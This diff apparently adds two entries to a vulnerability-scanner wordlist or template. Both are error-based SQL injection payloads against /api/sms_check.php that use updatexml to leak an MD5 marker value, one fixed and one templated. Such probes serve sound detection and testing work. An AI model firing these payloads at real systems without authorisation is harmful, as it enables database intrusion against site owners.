@@ -1,0 +1,2 @@
+/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5({{num}})),0x7e),1)--%20
